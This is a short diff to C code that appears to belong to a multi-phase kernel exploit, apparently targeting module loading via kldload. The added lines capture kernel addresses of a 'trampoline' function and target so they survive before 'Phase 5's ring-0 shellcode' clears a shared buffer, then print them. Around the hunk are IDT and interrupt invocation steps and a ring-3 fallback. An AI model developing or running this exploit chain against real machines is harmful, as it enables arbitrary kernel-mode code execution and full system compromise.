@@ -2414,6 +2414,21 @@ static void campaign_kmod_kldload(void) {
         else
             printf("[-] Buffer still zero after INT invocation.\n");
 
+        /* Extract trampoline addresses NOW, before Phase 5 clears the buffer.
+         * Phase 5's ring-0 shellcode zeroes the entire shared buffer before
+         * writing its own results, which would overwrite hv_init's trampoline
+         * addresses. */
+        if (results->trampoline_func_kva != 0 && results->trampoline_target_kva != 0) {
+            g_kmod_trampoline_func = results->trampoline_func_kva;
+            g_kmod_trampoline_target = results->trampoline_target_kva;
+            g_kmod_kid = kid;
+            printf("[+] Phase 7 trampoline addresses (saved before Phase 5):\n");
+            printf("    trampoline_xapic_mode() = 0x%016lx\n",
+                   (unsigned long)g_kmod_trampoline_func);
+            printf("    g_trampoline_target     = 0x%016lx\n",
+                   (unsigned long)g_kmod_trampoline_target);
+        }
+
         goto idt_done;
 
 ring3_fallback:
